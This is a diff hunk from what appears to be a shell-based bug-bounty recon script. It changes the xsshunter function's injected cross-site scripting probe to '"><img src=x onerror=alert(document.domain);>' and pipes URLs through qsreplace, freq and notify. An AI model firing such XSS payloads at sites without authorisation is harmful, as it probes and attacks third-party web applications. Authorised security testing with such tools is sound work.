@@ -341,7 +341,7 @@ xsshunter() {
   # [ -s "filtered_urls.txt" ] && dalfox file filtered_urls.txt --skip-bav -o XSSresult
   # [ -s "XSSresult" ] && cat XSSresult | notify -id xss
     echo '[+] Freq xss'
-  [ -s "filtered_urls.txt" ] && cat filtered_urls.txt | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
+  [ -s "filtered_urls.txt" ] && cat filtered_urls.txt | qsreplace '"><img src=x onerror=alert(document.domain);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
   [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
 }
 bypass4xx() {
